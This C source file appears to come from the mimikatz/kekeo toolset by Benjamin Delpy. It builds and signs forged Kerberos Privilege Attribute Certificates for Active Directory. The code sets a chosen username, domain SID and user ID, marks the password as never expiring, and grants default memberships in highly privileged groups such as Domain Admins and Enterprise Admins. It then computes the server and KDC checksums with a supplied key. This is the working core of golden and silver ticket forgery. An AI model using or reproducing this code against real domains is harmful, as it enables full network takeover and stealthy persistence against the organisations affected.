/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "kuhl_m_kerberos_pac.h"

GROUP_MEMBERSHIP kuhl_m_pac_defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
BOOL kuhl_m_pac_giveMePac(PCSTR Username, PSID DomainSid, DWORD UserId, KerberosTime *AuthTime, DWORD SignatureType, EncryptionKey * SignatureKey, _octet1 *pac)
{
	BOOL status = FALSE;
	KERB_VALIDATION_INFO validationInfo = {0};
	STRING user;
	kull_m_kerberos_asn1_helper_util_UTCKerberosTimeToFileTime(AuthTime, &validationInfo.LogonTime);
	KIWI_NEVERTIME(&validationInfo.LogoffTime);
	KIWI_NEVERTIME(&validationInfo.KickOffTime);
	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);
	RtlInitUnicodeString(&validationInfo.LogonDomainName, L"eo.oe.kiwi :)");

	pac->length = 0;
	pac->value = NULL;

	RtlInitString(&user, Username);
	if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&validationInfo.EffectiveName, &user, TRUE)))
	{
		validationInfo.LogonDomainId = (PISID) DomainSid;

		validationInfo.UserId				= UserId;
		validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
		validationInfo.PrimaryGroupId		= kuhl_m_pac_defaultGroups[0].RelativeId;
		validationInfo.GroupCount = ARRAYSIZE(kuhl_m_pac_defaultGroups);
		validationInfo.GroupIds = kuhl_m_pac_defaultGroups;

		if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, (PPACTYPE *) &pac->value, (DWORD *) &pac->length))
		{
			kprintf("  * PAC generated\n");
			if(status = NT_SUCCESS(kuhl_m_pac_signature((PPACTYPE) pac->value, pac->length, SignatureType, SignatureKey ? SignatureKey->keyvalue.value : NULL, SignatureKey ?  SignatureKey->keyvalue.length : 0)))
				kprintf("  * PAC \"\"\"signed\"\"\"\n");
			else LocalFree(pac->value);
		}
		RtlFreeUnicodeString(&validationInfo.EffectiveName);
	}
	return status;
}

BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, DWORD SignatureType, PPACTYPE * pacType, DWORD * pacLength)
{
	BOOL status = FALSE;
	PRPCE_KERB_VALIDATION_INFO pLogonInfo = NULL;
	DWORD szLogonInfo = 0, szLogonInfoAligned = 0;
	PPAC_CLIENT_INFO pClientInfo = NULL;
	DWORD szClientInfo = 0, szClientInfoAligned = 0;
	PAC_SIGNATURE_DATA signature = {SignatureType, {0}};//, {0}, 0, 0};
	DWORD szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned;//sizeof(PAC_SIGNATURE_DATA) - 2 * sizeof(USHORT), szSignatureAligned;
	DWORD modulo, offsetData = sizeof(PACTYPE) + 3 * sizeof(PAC_INFO_BUFFER);
	PKERB_CHECKSUM pCheckSum;

	status = CDLocateCheckSum(SignatureType, &pCheckSum);
	if(NT_SUCCESS(status))
	{
		if(kuhl_m_pac_validationInfo_to_LOGON_INFO(validationInfo, &pLogonInfo, &szLogonInfo))
		{
			szLogonInfoAligned = szLogonInfo;
			if(modulo = szLogonInfo % 8)
				szLogonInfoAligned += 8 - modulo;
		}
		if(kuhl_m_pac_validationInfo_to_CNAME_TINFO(validationInfo, &pClientInfo, &szClientInfo))
		{
			szClientInfoAligned = szClientInfo;
			if(modulo = szClientInfo % 8)
				szClientInfoAligned += (8 - modulo);
		}

		szSignature += pCheckSum->Size;

		szSignatureAligned = szSignature;
		if(modulo = szSignature % 8)
			szSignatureAligned += 8 - modulo;

		if(pLogonInfo && pClientInfo)
		{
			*pacLength = offsetData + szLogonInfoAligned + szClientInfoAligned + 2 * szSignatureAligned;
			if(*pacType = (PPACTYPE) LocalAlloc(LPTR, *pacLength))
			{
				(*pacType)->cBuffers = 4;
				(*pacType)->Version = 0;

				(*pacType)->Buffers[0].cbBufferSize = szLogonInfo;
				(*pacType)->Buffers[0].ulType = PACINFO_TYPE_LOGON_INFO;
				(*pacType)->Buffers[0].Offset = offsetData;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[0].Offset, pLogonInfo, (*pacType)->Buffers[0].cbBufferSize);

				(*pacType)->Buffers[1].cbBufferSize = szClientInfo;
				(*pacType)->Buffers[1].ulType = PACINFO_TYPE_CNAME_TINFO;
				(*pacType)->Buffers[1].Offset = (*pacType)->Buffers[0].Offset + szLogonInfoAligned;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[1].Offset, pClientInfo, (*pacType)->Buffers[1].cbBufferSize);

				(*pacType)->Buffers[2].cbBufferSize = szSignature;
				(*pacType)->Buffers[2].ulType = PACINFO_TYPE_CHECKSUM_SRV;
				(*pacType)->Buffers[2].Offset = (*pacType)->Buffers[1].Offset + szClientInfoAligned;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[2].Offset, &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));

				(*pacType)->Buffers[3].cbBufferSize = szSignature;
				(*pacType)->Buffers[3].ulType = PACINFO_TYPE_CHECKSUM_KDC;
				(*pacType)->Buffers[3].Offset = (*pacType)->Buffers[2].Offset + szSignatureAligned;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[3].Offset, &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));

				status = TRUE;
			}
		}

		if(pLogonInfo)
			LocalFree(pLogonInfo);
		if(pClientInfo)
			LocalFree(pClientInfo);
	}
	return status;
}

NTSTATUS kuhl_m_pac_signature(PPACTYPE pacType, DWORD pacLenght, DWORD SignatureType, LPCVOID key, DWORD keySize)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	DWORD i;
	PKERB_CHECKSUM pCheckSum;
	PVOID Context;
	PPAC_SIGNATURE_DATA pSignatureData;
	PBYTE checksumSrv = NULL, checksumpKdc = NULL;

	status = CDLocateCheckSum(SignatureType, &pCheckSum);
	if(NT_SUCCESS(status))
	{
		for(i = 0; i < pacType->cBuffers; i++)
		{
			if((pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_SRV) || (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_KDC))
			{
				pSignatureData = (PPAC_SIGNATURE_DATA) ((PBYTE) pacType + pacType->Buffers[i].Offset);
				RtlZeroMemory(pSignatureData->Signature, pCheckSum->Size);
				if(pacType->Buffers[i].ulType ==  PACINFO_TYPE_CHECKSUM_SRV)
					checksumSrv = pSignatureData->Signature;
				else
					checksumpKdc = pSignatureData->Signature;
			}
		}
		if(checksumSrv && checksumpKdc)
		{
			status = pCheckSum->InitializeEx(key, keySize, KERB_NON_KERB_CKSUM_SALT, &Context);
			if(NT_SUCCESS(status))
			{
				pCheckSum->Sum(Context, pacLenght, pacType);
				pCheckSum->Finalize(Context, checksumSrv);
				pCheckSum->Finish(&Context);
				status = pCheckSum->InitializeEx(key, keySize, KERB_NON_KERB_CKSUM_SALT, &Context);
				if(NT_SUCCESS(status))
				{
					pCheckSum->Sum(Context, pCheckSum->Size, checksumSrv);
					pCheckSum->Finalize(Context, checksumpKdc);
					pCheckSum->Finish(&Context);
				}
			}
		}
	}
	return status;
}

BOOL kuhl_m_pac_marshall_unicodestring(PUNICODE_STRING pString, PMARSHALL_UNICODE_STRING pMarshall, RPCEID id, PVOID * current, DWORD * size)
{
	BOOL status = FALSE;
	PVOID newbuffer;
	DWORD modulo, actualsize = sizeof(MARSHALLED_UNICODE_STRING) + pString->Length;

	if(modulo = actualsize % 4)
		actualsize += 4 - modulo;

	if(newbuffer = LocalAlloc(LPTR, *size + actualsize))
	{
		pMarshall->Length = pString->Length;
		pMarshall->MaximumLength = pString->MaximumLength;
		pMarshall->ElementId = id;

		RtlCopyMemory(newbuffer, *current, *size);
		((PMARSHALLED_UNICODE_STRING) ((PBYTE) newbuffer + *size))->ReservedElements = pString->MaximumLength / sizeof(wchar_t);
		((PMARSHALLED_UNICODE_STRING) ((PBYTE) newbuffer + *size))->Elements = pString->Length / sizeof(wchar_t);
		RtlCopyMemory((PBYTE) newbuffer + *size + sizeof(MARSHALLED_UNICODE_STRING), pString->Buffer, pString->Length);

		LocalFree(*current);
		*current = newbuffer;
		*size += actualsize;

		status = TRUE;
	}
	return status;
}

BOOL kuhl_m_pac_marshall_groups(PGROUP_MEMBERSHIP pGroups, DWORD nbGroups, PVOID * current, DWORD * size)
{
	BOOL status = FALSE;
	PVOID newbuffer;
	DWORD i, actualsize = sizeof(ULONG32) + nbGroups * sizeof(GROUP_MEMBERSHIP);

	if(newbuffer = LocalAlloc(LPTR, *size + actualsize))
	{
		RtlCopyMemory(newbuffer, *current, *size);
		(*(PULONG32) ((PBYTE) newbuffer + *size)) = nbGroups;
		for(i = 0 ; i < nbGroups; i++)
			((PGROUP_MEMBERSHIP) ((PBYTE) newbuffer + *size + sizeof(ULONG32)))[i] = pGroups[i];

		LocalFree(*current);
		*current = newbuffer;
		*size += actualsize;

		status = TRUE;
	}
	return status;
}

BOOL kuhl_m_pac_marshall_sid(PISID pSid, PVOID * current, DWORD * size)
{
	BOOL status = FALSE;
	PVOID newbuffer;
	DWORD sidSize, actualsize;

	sidSize = 1 + 1 + 6 + pSid->SubAuthorityCount * sizeof(DWORD);
	actualsize = sizeof(ULONG32) + sidSize;

	if(newbuffer = LocalAlloc(LPTR, *size + actualsize))
	{
		RtlCopyMemory(newbuffer, *current, *size);
		(*(PULONG32) ((PBYTE) newbuffer + *size)) = pSid->SubAuthorityCount;
		RtlCopyMemory((PBYTE) newbuffer + *size + sizeof(ULONG32), pSid, sidSize);

		LocalFree(*current);
		*current = newbuffer;
		*size += actualsize;

		status = TRUE;
	}
	return status;
}

BOOL kuhl_m_pac_validationInfo_to_LOGON_INFO(PKERB_VALIDATION_INFO validationInfo, PRPCE_KERB_VALIDATION_INFO * rpceValidationInfo, DWORD *rpceValidationInfoLength)
{
	BOOL status = FALSE;
	RPCE_KERB_VALIDATION_INFO rpce;
	PVOID buffer = NULL;
	DWORD szBuffer = 0;

	rpce.typeHeader.Version = 0x01;
	rpce.typeHeader.Endianness = 0x10;
	rpce.typeHeader.CommonHeaderLength = 8;
	rpce.typeHeader.Filler = 0xcccccccc;
	rpce.privateHeader.Filler = 0x00000000;

	rpce.RootElementId = PACINFO_ID_KERB_VALINFO;

	rpce.infos.LogonTime = validationInfo->LogonTime;
	rpce.infos.LogoffTime = validationInfo->LogoffTime;
	rpce.infos.KickOffTime = validationInfo->KickOffTime;
	rpce.infos.PasswordLastSet = validationInfo->PasswordLastSet;
	rpce.infos.PasswordCanChange = validationInfo->PasswordCanChange;
	rpce.infos.PasswordMustChange = validationInfo->PasswordMustChange;

	kuhl_m_pac_marshall_unicodestring(&validationInfo->EffectiveName,		&rpce.infos.EffectiveName,		PACINFO_ID_KERB_EFFECTIVENAME,		&buffer, &szBuffer);
	kuhl_m_pac_marshall_unicodestring(&validationInfo->FullName,			&rpce.infos.FullName,			PACINFO_ID_KERB_FULLNAME,			&buffer, &szBuffer);
	kuhl_m_pac_marshall_unicodestring(&validationInfo->LogonScript,			&rpce.infos.LogonScript,		PACINFO_ID_KERB_LOGONSCRIPT,		&buffer, &szBuffer);
	kuhl_m_pac_marshall_unicodestring(&validationInfo->ProfilePath,			&rpce.infos.ProfilePath,		PACINFO_ID_KERB_PROFILEPATH,		&buffer, &szBuffer);
	kuhl_m_pac_marshall_unicodestring(&validationInfo->HomeDirectory,		&rpce.infos.HomeDirectory,		PACINFO_ID_KERB_HOMEDIRECTORY,		&buffer, &szBuffer);
	kuhl_m_pac_marshall_unicodestring(&validationInfo->HomeDirectoryDrive,	&rpce.infos.HomeDirectoryDrive,	PACINFO_ID_KERB_HOMEDIRECTORYDRIVE,	&buffer, &szBuffer);

	rpce.infos.LogonCount = validationInfo->LogonCount;
	rpce.infos.BadPasswordCount = validationInfo->BadPasswordCount;

	rpce.infos.UserId = validationInfo->UserId;
	rpce.infos.PrimaryGroupId = validationInfo->PrimaryGroupId;

	rpce.infos.GroupCount = validationInfo->GroupCount;
	rpce.infos.GroupIds = PACINFO_ID_KERB_GROUPIDS;
	kuhl_m_pac_marshall_groups(validationInfo->GroupIds, validationInfo->GroupCount, &buffer, &szBuffer);

	rpce.infos.UserFlags = validationInfo->UserFlags;
	RtlCopyMemory(rpce.infos.UserSessionKey.data, validationInfo->UserSessionKey.data, 16);

	kuhl_m_pac_marshall_unicodestring(&validationInfo->LogonServer,			&rpce.infos.LogonServer,		PACINFO_ID_KERB_LOGONSERVER,		&buffer, &szBuffer);
	kuhl_m_pac_marshall_unicodestring(&validationInfo->LogonDomainName,		&rpce.infos.LogonDomainName,	PACINFO_ID_KERB_LOGONDOMAINNAME,	&buffer, &szBuffer);

	rpce.infos.LogonDomainId = PACINFO_ID_KERB_LOGONDOMAINID;
	kuhl_m_pac_marshall_sid(validationInfo->LogonDomainId, &buffer, &szBuffer);

	rpce.infos.Reserved1[0] = validationInfo->Reserved1[0];
	rpce.infos.Reserved1[1] = validationInfo->Reserved1[1];

	rpce.infos.UserAccountControl = validationInfo->UserAccountControl;
	rpce.infos.SubAuthStatus = validationInfo->SubAuthStatus;

	rpce.infos.LastSuccessfulILogon = validationInfo->LastSuccessfulILogon;
	rpce.infos.LastFailedILogon = validationInfo->LastFailedILogon;
	rpce.infos.FailedILogonCount = validationInfo->FailedILogonCount;

	rpce.infos.Reserved3 = validationInfo->Reserved3;

	rpce.infos.SidCount = 0; //validationInfo->SidCount;
	rpce.infos.ExtraSids = 0; // lazy;
	rpce.infos.ResourceGroupDomainSid = 0; //lazy
	rpce.infos.ResourceGroupCount = 0; //validationInfo->ResourceGroupCount;
	rpce.infos.ResourceGroupIds = 0; // lazy

	rpce.privateHeader.ObjectBufferLength = sizeof(MARSHALL_KERB_VALIDATION_INFO) + sizeof(ULONG) + szBuffer;
	*rpceValidationInfoLength = sizeof(RPCE_KERB_VALIDATION_INFO) + szBuffer;
	if(*rpceValidationInfo = (PRPCE_KERB_VALIDATION_INFO) LocalAlloc(LPTR, *rpceValidationInfoLength))
	{
		RtlCopyMemory(*rpceValidationInfo, &rpce, sizeof(RPCE_KERB_VALIDATION_INFO));
		RtlCopyMemory((PBYTE) *rpceValidationInfo + sizeof(RPCE_KERB_VALIDATION_INFO), buffer, szBuffer);
		status = TRUE;
	}
	if(buffer)
		LocalFree(buffer);

	return status;
}

BOOL kuhl_m_pac_validationInfo_to_CNAME_TINFO(PKERB_VALIDATION_INFO validationInfo, PPAC_CLIENT_INFO * pacClientInfo, DWORD * pacClientInfoLength)
{
	BOOL status = FALSE;
	*pacClientInfoLength = sizeof(PAC_CLIENT_INFO) + validationInfo->EffectiveName.Length - sizeof(wchar_t);
	if(*pacClientInfo = (PPAC_CLIENT_INFO) LocalAlloc(LPTR, *pacClientInfoLength))
	{
		(*pacClientInfo)->ClientId = validationInfo->LogonTime;
		(*pacClientInfo)->NameLength = validationInfo->EffectiveName.Length;
		RtlCopyMemory((*pacClientInfo)->Name, validationInfo->EffectiveName.Buffer, (*pacClientInfo)->NameLength);
		status = TRUE;
	}
	return status;
}